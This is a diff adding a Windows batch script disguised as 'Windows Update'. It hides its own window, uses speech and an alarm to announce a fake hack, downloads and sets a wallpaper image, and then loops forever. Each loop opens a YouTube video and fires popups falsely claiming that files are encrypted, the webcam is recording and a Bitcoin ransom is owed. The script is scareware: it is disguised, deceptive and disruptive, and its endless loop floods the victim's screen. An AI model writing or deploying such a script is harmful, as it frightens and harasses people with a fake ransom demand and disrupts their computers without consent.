@@ -1,0 +1,35 @@
+@echo off
+title Windows Update
+color 0c
+
+:: This trick hides the black command prompt window immediately
+if not "%~1"=="hidden" (
+    powershell -window hidden -command "& '%~f0' hidden"
+    exit /b
+)
+
+:: 1. Text to Speech (Pasha's warning)
+powershell -c "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate = -2; $s.Speak('Pasha has hacked your PC. Your files are being encrypted. Pay for his joints.')"
+
+:: 2. Play a scary Windows system alarm sound
+powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Alarm01.wav').PlaySync();"
+
+:: 3. Download Hello Kitty and set it as the wallpaper
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/hello_kitty.png' -OutFile \"$env:TEMP\hk.png\""
+powershell -c "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [W]::SystemParametersInfo(20, 0, \"$env:TEMP\hk.png\", 3)"
+
+:: 4. The infinite loop of terror
+:loop
+:: Open the YouTube video
+start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+
+:: Spam native Windows error popups
+msg * "CRITICAL ERROR: Your files are encrypted by Pasha."
+msg * "WEBCAM ACTIVATED. RECORDING IN PROGRESS."
+msg * "PAY 0.5 BTC FOR PASHA'S JOINTS TO RECOVER FILES."
+
+:: Wait 2 seconds before doing it again
+timeout /t 2 /nobreak >nul
+
+:: Loop back to the top
+goto loop
